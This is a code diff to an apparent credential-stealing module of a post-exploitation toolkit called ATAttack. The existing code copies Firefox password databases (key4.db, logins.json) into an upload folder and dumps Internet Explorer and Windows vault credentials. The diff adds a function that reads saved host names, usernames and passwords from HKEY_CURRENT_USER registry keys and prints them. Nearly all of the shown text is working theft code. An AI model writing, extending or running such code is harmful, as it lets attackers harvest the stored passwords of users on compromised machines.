@@ -13,6 +13,7 @@ from ATAttack.framework.constant import constant
 import subprocess
 import _subprocess as sub
 import tempfile
+from winreg import OpenKey, HKEY_CURRENT_USER, EnumKey, EnumValue,CloseKey
 
 tmp = tempfile.gettempdir()
 
@@ -86,7 +87,6 @@ class decypt():
                 pass
 
     def get_firefox_profiles(self):
-
         iniPath = os.path.join(constant.profile['APPDATA'],
                                r'Mozilla\Firefox\profiles.ini')
         config = configparser.ConfigParser()
@@ -95,7 +95,6 @@ class decypt():
             constant.profile['APPDATA'],r'Mozilla\Firefox',config['Profile0']['Path'] + '\\') .replace("/", "\\")
 
     def send_firefox_data(self):
-
         key = ['key4.db', 'key3.db', 'logins.json']
         for db in key:
             filename = self.get_firefox_profiles() + db
@@ -103,8 +102,6 @@ class decypt():
                 shutil.copy(filename, constant.upload_dir)
 
     def ie_decrypt(self):
-
-
         try:
             cmdline = '''
                     try
@@ -177,3 +174,37 @@ class decypt():
             print "Get windows vault web credentials :" + "\n" + str(values_)
         except Exception:
             pass
+
+    def get_info(self,reg):
+        key = OpenKey(HKEY_CURRENT_USER, reg)
+        conns = []
+        try:
+            i = 0
+            while 1:
+                name = EnumKey(key, i)
+                conns.append(name)
+                i += 1
+        except:
+            pass
+        hosts = []
+        usernames = []
+        passwords = []
+        for i in conns:
+            key = OpenKey(HKEY_CURRENT_USER, reg + '\\' + i)
+            try:
+                j = 0
+                while 1:
+                    name, value, type = EnumValue(key, j)
+                    if name == 'Host':
+                        hosts.append(value)
+                    if name == 'UserName':
+                        usernames.append(value)
+                    if name == 'Pwd':
+                        passwords.append(value)
+                    j += 1
+            except:
+                pass
+        CloseKey(key)
+        for i in range(len(hosts)):
+            if len(hosts[i]) is not 0:
+                print 'host_name:' + hosts[i] + '  ' + 'username:' + usernames[i] + '  ' + 'password:' + passwords[i]
